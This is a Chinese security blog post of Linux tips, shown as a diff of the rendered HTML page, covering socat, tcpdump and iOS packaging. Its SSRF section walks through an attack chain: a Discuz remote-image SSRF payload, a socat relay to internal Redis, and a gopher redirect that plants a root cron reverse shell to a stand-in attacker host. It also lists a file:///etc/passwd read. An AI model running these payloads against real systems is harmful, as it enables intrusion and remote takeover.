@@ -1,0 +1,1230 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="介绍几个在linux平台运行的工具，顺带表扬下我用了一年的腾讯云学生机 socatsocat的安装 Centos 1$ yum install -y socat  Debian/Ubuntu 1$ apt-get install -y socat  macOS 1$ brew install socat  使用实例 1.读文件 12345# 从绝对路径读取$ socat - /var/www/ht">
+<meta name="keywords" content="linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux小技巧">
+<meta property="og:url" content="https://wh0ale.github.io/2019/03/05/2019-3-5-linux的小技巧/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="介绍几个在linux平台运行的工具，顺带表扬下我用了一年的腾讯云学生机 socatsocat的安装 Centos 1$ yum install -y socat  Debian/Ubuntu 1$ apt-get install -y socat  macOS 1$ brew install socat  使用实例 1.读文件 12345# 从绝对路径读取$ socat - /var/www/ht">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rvnnipdej20u002ajrn.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rvvoog5hj20u00e20ti.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rx5viw46j211y0d2dhl.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rx7lp2f7j20cu0ant91.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rxcohvnfj20a906zweh.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rxqvhwqyj20pb02w74h.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.327Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="linux小技巧">
+<meta name="twitter:description" content="介绍几个在linux平台运行的工具，顺带表扬下我用了一年的腾讯云学生机 socatsocat的安装 Centos 1$ yum install -y socat  Debian/Ubuntu 1$ apt-get install -y socat  macOS 1$ brew install socat  使用实例 1.读文件 12345# 从绝对路径读取$ socat - /var/www/ht">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rvnnipdej20u002ajrn.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/03/05/2019-3-5-linux的小技巧/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>linux小技巧 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/03/05/2019-3-5-linux的小技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">linux小技巧
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-05 00:00:00" itemprop="dateCreated datePublished" datetime="2019-03-05T00:00:00+08:00">2019-03-05</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">11k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">10 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p>介绍几个在linux平台运行的工具，顺带表扬下我用了一年的腾讯云学生机</p>
+<h1 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h1><p><strong>socat的安装</strong></p>
+<p>Centos</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yum install -y socat</span><br></pre></td></tr></table></figure>
+
+<p>Debian/Ubuntu</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install -y socat</span><br></pre></td></tr></table></figure>
+
+<p>macOS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install socat</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用实例</strong></p>
+<p><strong>1.读文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 从绝对路径读取</span><br><span class="line">$ socat - /var/www/html/flag.php</span><br><span class="line"></span><br><span class="line"># 从相对路径读取</span><br><span class="line">$ socat - ./flag.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>写入文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;This is Test&quot; | socat - /tmp/hello.html</span><br></pre></td></tr></table></figure>
+
+<p><strong>网络管理</strong></p>
+<ul>
+<li>连接远程端口</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ socat - TCP:192.168.1.252:3306</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>监听一个新端口</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ socat TCP-LISTEN:7000 -</span><br></pre></td></tr></table></figure>
+
+<p><strong>端口转发</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;1. -d -d  前面两个连续的 -d -d 代表调试信息的输出级别。</span><br><span class="line">&gt;2. -lf /var/log/socat.log 指定输出信息的文件保存位置。</span><br><span class="line">&gt;3. TCP4-LISTEN:15672 在本地建立一个 TCP IPv4 协议的监听端口，也就是转发端口。这里是 15672，请根据实际情况改成你自己需要转发的端口。</span><br><span class="line">&gt;4. bind 指定监听绑定的 IP 地址，不绑定的话将监听服务器上可用的全部 IP。</span><br><span class="line">&gt;5. reuseaddr 绑定一个本地端口。</span><br><span class="line">&gt;6. fork TCP4:172.17.0.15:15672 指的是要转发到的服务器 IP 和端口，这里是 172.17.0.15 的 15672 端口。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><strong>转发 UDP</strong></p>
+<p>转发 UDP 和 TCP 类似，只要把 TCP4 改成 UDP4 就行了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ socat -d -d -lf /var/log/socat.log UDP4-LISTEN:123,bind=192.168.1.252,reuseaddr,fork UDP4:172</span><br></pre></td></tr></table></figure>
+
+<p><strong>NAT映射</strong></p>
+<p>在一个 NAT 网络环境中，也是可以通过 Socat 将内部机器端口映射到公网上的。</p>
+<p>在外部公网机器上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ socat tcp-listen:1234 tcp-listen:3389</span><br></pre></td></tr></table></figure>
+
+<p>在内部私网机器上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ socat tcp:outerhost:1234 tcp:192.168.1.34:3389</span><br></pre></td></tr></table></figure>
+
+<p>这样，你外部机器上的 3389 就映射在内网 192.168.1.34 的 3389 端口上了。不过这样场景下更推荐内网穿透神器 FRP，如果你不会使用，可参考「<a href="https://mp.weixin.qq.com/s/8HeeDC5x5xozElN8GzQLLw" target="_blank" rel="noopener">推荐一款很好用的内网穿透工具–FRP</a>」一文。</p>
+<h2 id="配合CURL-SSRF"><a href="#配合CURL-SSRF" class="headerlink" title="配合CURL SSRF"></a>配合CURL SSRF</h2><p><strong>什么地方最容易出现SSRF</strong></p>
+<ol>
+<li>云服务器商。(各种网站数据库操作)</li>
+<li>有远程图片加载的地方。(编辑器之类的有远程图片加载啊)</li>
+<li>网站采集、网页抓取的地方。(很多网站会有新闻采集输入url然后一键采集)</li>
+<li>头像的地方。(某易就喜欢远程加载头像，例如:<a href="http://www.xxxx.com/image?url=http://www.image.com/1.jpg" target="_blank" rel="noopener">http://www.xxxx.com/image?url=http://www.image.com/1.jpg</a>)</li>
+<li>最后一个一切要你输入网址的地方和可以输入ip的都放，都是ssrf的天下。</li>
+</ol>
+<p><strong>SSRF漏洞的危害</strong></p>
+<ol>
+<li>对服务器所在的内网进行端口扫描，获取一些服务的banner信息等</li>
+<li>攻击运行在内网或者本地的应用程序</li>
+<li>对内网WEB应用进行指纹识别，通过访问默认文件实现（Readme等文件）</li>
+<li>攻击内外网的WEB应用，主要是GET就可以实现的攻击（比如Struts2，SQL注入等）</li>
+<li>下载内网资源（利用file协议读取本地文件等）</li>
+<li>利用Redis未授权访问，HTTP CRLF注入达到getshell</li>
+<li>wooyun峰会猪猪侠的ppt</li>
+<li>进行跳板</li>
+<li>无视cdn</li>
+</ol>
+<p><strong>SSRF神器Curl的使用</strong></p>
+<p>查看curl支持的协议列表 #curl--config –protocols</p>
+<ul>
+<li><p>使用curl读取文件</p>
+<p>curl -v file:///etc/passwd</p>
+</li>
+<li><p>使用ftp协议</p>
+<p>curl -v &quot;<a href="ftp://127.0.0.1:6666/info&quot;" target="_blank" rel="noopener">ftp://127.0.0.1:6666/info&quot;</a></p>
+</li>
+<li><p>使用dict协议</p>
+<p>curl -v &quot;dict://127.0.0.1:6666/info&quot;</p>
+</li>
+<li><p>使用gopher协议</p>
+<p>curl -v &quot;gopher://127.0.0.1:6666/_info&quot;</p>
+</li>
+</ul>
+<p><strong>案例</strong></p>
+<p>ssrf.php内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ip=$_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port=$_GET[<span class="string">'port'</span>];</span><br><span class="line">$scheme=$_GET[<span class="string">'s'</span>];</span><br><span class="line">$data=$_GET[<span class="string">'data'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>① payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Discuz_X3.1/upload/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://hacker.xxxx.com/ssrf.php?s=ftp&amp;ip=172.28.100.108&amp;port=6666&amp;data=he2lo.jpg[/img]</span><br></pre></td></tr></table></figure>
+
+<p>② socat的使用</p>
+<p>本地kali监听，当在受害者网站执行上面的payload 的时候，本地的6666端口收到消息，然后将数据包发送给本地的172.28.100.108:6379（相当于内网中开放redis服务的6379端口）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:6666,fork tcp-connect:172.28.100.108:6379</span><br></pre></td></tr></table></figure>
+
+<p>③ kali本地执行</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rvnnipdej20u002ajrn.jpg" alt></p>
+<p>到redis服务器的上查看/var/spool/cron目录下已经创建了root文件内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * bash -i &gt;&amp;/dev/tcp/hacker.xxxx.com/9999 0&gt;&amp;1 每一分钟向攻击者的服务器的9999端口建立连接</span><br></pre></td></tr></table></figure>
+
+<p>将socat的输出信息保存为1.txt，上传到公网服务器上</p>
+<hr>
+<p>① 使用Python脚本转换为<strong>gopher</strong>支持的格式</p>
+<p>在这之前应该检测是否支持gopher协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>② kali服务器上存放gopher.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Location: gopher://172.28.100.108:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/hacker.xxxx.com/9999 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>③ 在受害者存在ssrf的网站上访问，本地nc监听 即可拿到shell</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rvvoog5hj20u00e20ti.jpg" alt></p>
+<h1 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h1><p>该命令应急以及平时都会经常使用到，linux下抓包观察流量的作用</p>
+<p><strong>监视指定网络接口的数据包</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1</span><br></pre></td></tr></table></figure>
+
+<p>也可以指定<a href="http://man.linuxde.net/ip" target="_blank" rel="noopener">ip</a>,例如截获所有210.27.48.1 的主机收到的和发出的所有的数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump host 210.27.48.1</span><br></pre></td></tr></table></figure>
+
+<p>抓取所有经过eth1，目的或源地址是192.168.1.1的网络数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 host 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p><strong>监视指定主机和端口的数据包</strong></p>
+<p>如果想要获取主机210.27.48.1接收或发出的<a href="http://man.linuxde.net/telnet" target="_blank" rel="noopener">telnet</a>包，使用如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump tcp port 23 host 210.27.48.1</span><br></pre></td></tr></table></figure>
+
+<p>对本机的udp 123 端口进行监视 123 为ntp的服务端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump udp port 123</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>指定源地址</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 src host 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>指定目的地址</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 dst host 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>抓取所有经过eth1，目的或源端口是25的网络数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 port 25</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>指定源端口</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 src port 25</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>指定目的端口</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 dst port 25</span><br></pre></td></tr></table></figure>
+
+<p><strong>进阶用法</strong></p>
+<p>TCP标记值：</p>
+<p>tcp-fin, tcp-syn, tcp-rst, tcp-push, tcp-push, tcp-ack, tcp-urg</p>
+<ul>
+<li>只抓SYN包</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 &apos;tcp[tcpflags] = tcp-syn&apos;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>抓SYN, ACK</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 &apos;tcp[tcpflags] &amp; tcp-syn != 0 and tcp[tcpflags] &amp; tcp-ack != 0&apos;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>抓PSH-ACK</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 &apos;tcp[13] = 24&apos;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>抓所有包含FIN标记的包（FIN通常和ACK一起，表示幽会完了，回见）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 &apos;tcp[13] &amp; 1 = 1&apos;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>抓RST（勾搭没成功，伟大的greatwall对她认为有敏感信息的连接发RST包，典型的棒打鸳鸯）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 &apos;tcp[13] &amp; 4 = 4&apos;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>抓SMTP数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 &apos;((port 25) and (tcp[(tcp[12]&gt;&gt;2):4] = 0x4d41494c))&apos;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>抓HTTP GET数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 &apos;tcp[(tcp[12]&gt;&gt;2):4] = 0x47455420&apos;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>抓SSH返回</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth1 &apos;tcp[(tcp[12]&gt;&gt;2):4] = 0x5353482D&apos;</span><br></pre></td></tr></table></figure>
+
+<h1 id="ios打包成ipa"><a href="#ios打包成ipa" class="headerlink" title="ios打包成ipa"></a>ios打包成ipa</h1><p><strong>脚本自动生成ipa包</strong></p>
+<p>Step1: 新建文件夹，命名为“distribute”，新建distribute.sh脚本文件，内容为：(注意，脚本中所有appName请先替换成你的真正app名称)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm -rf appName</span><br><span class="line">mkdir appName</span><br><span class="line">mkdir appName/Payload</span><br><span class="line">cp -r appName.app appName/Payload/appName.app</span><br><span class="line">cp Icon.png appName/iTunesArtwork</span><br><span class="line"><span class="built_in">cd</span> appName</span><br><span class="line">zip -r appName.ipa Payload iTunesArtwork</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>Step2: 将要转化的.app文件放到distribute/文件夹下</p>
+<p>这时的文件夹目录结构是这样的：(注意，脚本中所有appName请先替换成你的真正app名称)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">distribute/distribute.sh</span><br><span class="line">distribute/appName.app</span><br></pre></td></tr></table></figure>
+
+<p>Step3: 运行distribute.sh脚本</p>
+<p>打开Terminal，cd到distribute文件夹下，把distribute.sh拉到terminal中执行。如果提示permission denied，则用“chmod 777 distribute.sh”命令赋予权限后，再执行一次distribute.sh。</p>
+<p>Step4: 大约若干秒后，会在distribute/文件夹下生成appName/文件夹，里面的appName.ipa就是我们想要的包。</p>
+<p><strong>手动压缩改后缀方式</strong></p>
+<p>这种方式与4.1的方法本质是一样的。</p>
+<p>Step1: 新建“Payload”文件夹，注意名字要一字不差；</p>
+<p>Step2: 将你的.app包放到Payload中，注意app的名字不做任何更改，就用xcode生成的app名称；</p>
+<p>Step3: 在Payload文件夹上右键压缩成zip，然后将生成的.zip文件后缀改成.ipa即可</p>
+<h1 id="一些应急的linux命令"><a href="#一些应急的linux命令" class="headerlink" title="一些应急的linux命令"></a>一些应急的linux命令</h1><h2 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h2><p><strong>uniq命令</strong>用于报告或忽略文件中的重复行，一般与<a href="http://man.linuxde.net/sort" target="_blank" rel="noopener">sort</a>命令结合使用。</p>
+<blockquote>
